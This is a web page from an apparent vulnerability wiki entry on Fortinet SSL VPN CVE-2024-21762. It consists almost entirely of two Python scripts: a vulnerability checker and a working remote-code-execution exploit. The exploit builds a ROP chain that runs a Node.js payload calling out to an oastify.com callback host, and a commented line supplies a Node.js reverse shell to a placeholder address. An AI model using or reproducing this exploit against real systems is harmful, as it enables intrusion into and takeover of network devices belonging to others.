<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Fortinet/Fortinet-SSL-VPN-CVE-2024-21762/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Fortinet SSL VPN CVE 2024 21762 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Fortinet-SSL-VPN-CVE-2024-21762", url: "#_top", children: [
          ]},
          {title: "poc", url: "#poc", children: [
          ]},
          {title: "exp", url: "#exp", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Fortinet%20FortiOS/%EF%BC%88CVE-2018-13379%EF%BC%89Fortinet%20FortiOS%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Fortinet%20FortiOS/%EF%BC%88CVE-2018-13379%EF%BC%89Fortinet%20FortiOS%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Fortigate/FortinetFortiOSmessage%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Fortigate/FortinetFortiOSmessage%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Fortinet FortiOS message存在xss漏洞
      </a>
    </div>
    
  </div>

    

    <h2 id="fortinet-ssl-vpn-cve-2024-21762">Fortinet-SSL-VPN-CVE-2024-21762<a class="headerlink" href="#fortinet-ssl-vpn-cve-2024-21762" title="Permanent link">&para;</a></h2>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">SSLContext</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_TLS_CLIENT</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">check_hostname</span><span class="o">=</span><span class="kc">False</span>
<span class="n">context</span><span class="o">.</span><span class="n">verify_mode</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>

<span class="c1"># should be fine for most hosts, increase this if you&#39;re getting errors.</span>
<span class="n">TIMEOUT</span><span class="o">=</span><span class="mi">5</span>

<span class="k">def</span><span class="w"> </span><span class="nf">send_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">req</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
    <span class="n">ss</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">ss</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">ss</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>

<span class="n">control_req</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;POST /remote/VULNCHECK HTTP/1.1</span><span class="se">\r</span>
<span class="s2">Host: </span><span class="si">{}</span><span class="se">\r</span>
<span class="s2">Transfer-Encoding: chunked</span><span class="se">\r</span>
<span class="se">\r</span>
<span class="s2">0</span><span class="se">\r</span>
<span class="se">\r</span>
<span class="se">\r</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="n">check_req</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;POST /remote/VULNCHECK HTTP/1.1</span><span class="se">\r</span>
<span class="s2">Host: </span><span class="si">{}</span><span class="se">\r</span>
<span class="s2">Transfer-Encoding: chunked</span><span class="se">\r</span>
<span class="se">\r</span>
<span class="s2">0000000000000000FF</span><span class="se">\r</span>
<span class="se">\r</span>
<span class="s2">&quot;&quot;&quot;</span>
<span class="k">def</span><span class="w"> </span><span class="nf">check</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
    <span class="n">baseurl</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">*</span><span class="n">host</span><span class="p">)</span>
    <span class="n">r1</span><span class="o">=</span><span class="n">send_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">control_req</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">baseurl</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">r1</span><span class="o">==-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&quot;Connection Failed&quot;</span>
    <span class="k">if</span> <span class="n">r1</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&quot;Control request failed&quot;</span>
        <span class="k">return</span>
    <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;HTTP/1.1 403 Forbidden&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r1</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[warning] Server does not look like a Fortinet SSL VPN interface&quot;</span><span class="p">)</span>
    <span class="n">r2</span><span class="o">=</span><span class="n">send_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">check_req</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">baseurl</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">r2</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="s2">&quot;Vulnerable&quot;</span>
    <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="s2">&quot;Patched&quot;</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">host</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: check-cve-2024-21762.py &lt;host&gt; &lt;port&gt;&quot;</span><span class="p">)</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="n">HOST</span><span class="o">=</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">check</span><span class="p">(</span><span class="n">HOST</span><span class="p">))</span>
</code></pre></div>
<p><code>python3 check-cve-2024-21762.py &lt;host&gt; &lt;port&gt;</code></p>
<h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>


<span class="n">TARGET</span> <span class="o">=</span> <span class="s1">&#39;xxxxxxxxxxxx&#39;</span>  <span class="c1"># Target IP</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">443</span>  <span class="c1"># Target port, usually 443 for SSL VPN</span>

<span class="k">def</span><span class="w"> </span><span class="nf">make_sock</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">sock</span>

<span class="k">def</span><span class="w"> </span><span class="nf">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">make_sock</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
        <span class="n">ssock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">ssl_do_handshake_ptr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%60%</span><span class="s2">ce</span><span class="si">%42%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span>
    <span class="n">getcwd_ptr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%70%</span><span class="s2">62</span><span class="si">%2c%04%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span>

    <span class="n">pivot_1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%52%</span><span class="s2">f7</span><span class="si">%f</span><span class="s2">d</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># push rdi; pop rsp; ret;</span>
    <span class="n">pivot_2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">c</span><span class="si">%c</span><span class="s2">9</span><span class="si">%a</span><span class="s2">b</span><span class="si">%02%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># add rsp, 0x2a0; pop rbx; pop r12; pop rbp; ret;</span>

    <span class="n">rop</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%c</span><span class="s2">6</span><span class="si">%e</span><span class="s2">2</span><span class="si">%46%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span> <span class="c1"># push rdi; pop rax; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%19%</span><span class="s2">6f</span><span class="si">%4d%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># sub rax, 0x2c8; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%8e</span><span class="s2">%b2</span><span class="si">%f</span><span class="s2">e</span><span class="si">%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># add rax, 0x10; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%63%</span><span class="s2">db</span><span class="si">%a</span><span class="s2">e</span><span class="si">%02%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># pop rcx; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span> <span class="c1"># zero rcx</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%38%</span><span class="s2">ad</span><span class="si">%98%</span><span class="s2">02</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span> <span class="c1"># or rcx, rax; setne al; movzx eax, al; ret;</span>

    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%c</span><span class="s2">6</span><span class="si">%52%</span><span class="s2">86</span><span class="si">%02%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># shl rax, 4; add rax, rdx; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%6e%d</span><span class="s2">0</span><span class="si">%3f%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># or rdx, rcx; ret; - rdx is zero so this is a copy</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">4</span><span class="si">%d</span><span class="s2">f</span><span class="si">%98%</span><span class="s2">02</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span> <span class="c1"># sub rdx, rax; mov rax, rdx; ret;</span>

    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%f</span><span class="s2">5</span><span class="si">%2c%e</span><span class="s2">6</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1">#  sub rax, 0x10; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%e</span><span class="s2">4</span><span class="si">%e</span><span class="s2">6</span><span class="si">%d</span><span class="s2">7</span><span class="si">%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1">#  add rsi, rax; mov [rdi+8], rsi; ret;</span>

    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%10%</span><span class="s2">1b</span><span class="si">%0a%01%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># push rax; pop rdi; add eax, 0x5d5c415b; ret;</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%25%</span><span class="s2">0f</span><span class="si">%8d%02%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># pop r8; ret; 0x028d0f25</span>
    <span class="n">rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span> <span class="c1"># r8</span>

    <span class="n">pivot_3</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%e</span><span class="s2">0</span><span class="si">%3f%4d%02%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00%00&quot;</span> <span class="c1"># add rsp, 0xd90; pop rbx; pop r12; pop rbp; ret;</span>

    <span class="n">call_execl</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="si">%80%</span><span class="s2">c1</span><span class="si">%43%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00</span><span class="si">%00%</span><span class="s2">00&quot;</span>

    <span class="n">bin_node</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;/bin/node%00&quot;</span>
    <span class="n">e_flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;-e%00&quot;</span>
  <span class="c1">## use this one for rev shell   b&#39;(function(){var net%3drequire(&quot;net&quot;),cp%3drequire(&quot;child_process&quot;),sh%3dcp.spawn(&quot;/bin/node&quot;,[&quot;-i&quot;]);var client%3dnew net.Socket();client.connect(1337,&quot;xxxxxxxxxxx&quot;,function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();%00&#39;</span>
    <span class="n">js_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;(function(){var cp=require(&quot;child_process&quot;);cp.execSync(&quot;nslookup xxxxxxxxxxx.oastify.com&quot;);})();%00&#39;</span>

    <span class="n">form_value</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">bin_node</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">e_flag</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">14</span> <span class="o">+</span> <span class="n">js_payload</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">438</span> <span class="o">+</span> <span class="n">pivot_2</span> <span class="o">+</span> <span class="n">getcwd_ptr</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">pivot_1</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">168</span> <span class="o">+</span> <span class="n">call_execl</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">432</span> <span class="o">+</span> <span class="n">ssl_do_handshake_ptr</span>
    <span class="n">form_value</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">pivot_3</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">1808</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="n">form_value</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;&amp;&quot;</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span>

    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;POST /remote/hostcheck_validate HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">TARGET</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;Content-Length: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="n">body</span>

    <span class="n">send_payload</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">TARGET</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

    <span class="c1"># Short delay to ensure the server processes the first request</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="c1"># Preparing and sending the second part of the exploit</span>
    <span class="n">data</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">TARGET</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;Transfer-Encoding: chunked</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;0&quot;</span><span class="o">*</span><span class="mi">4137</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
    <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>

    <span class="n">send_payload</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">TARGET</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Fortinet%20FortiOS/%EF%BC%88CVE-2018-13379%EF%BC%89Fortinet%20FortiOS%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Fortinet%20FortiOS/%EF%BC%88CVE-2018-13379%EF%BC%89Fortinet%20FortiOS%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Fortigate/FortinetFortiOSmessage%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Fortigate/FortinetFortiOSmessage%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Fortinet FortiOS message存在xss漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>